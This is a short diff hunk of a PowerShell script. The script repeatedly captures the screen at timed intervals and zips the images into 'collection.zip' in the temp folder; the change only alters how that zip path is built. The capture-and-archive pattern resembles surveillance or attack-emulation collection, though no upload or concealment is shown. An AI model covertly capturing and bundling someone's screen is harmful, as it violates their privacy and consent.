@@ -26,7 +26,7 @@ for ($i = 0; $i -lt $numberOfCaptures; $i++) {
     $bitmap.Dispose()
     Start-Sleep -Seconds $interval
 }
-$zipFilePath = "$env:TEMP\collection.zip"
+$zipFilePath = Join-Path $env:TEMP "collection.zip"
 [IO.Compression.ZipFile]::CreateFromDirectory($outputDir, $zipFilePath)
 Start-Sleep 20
 
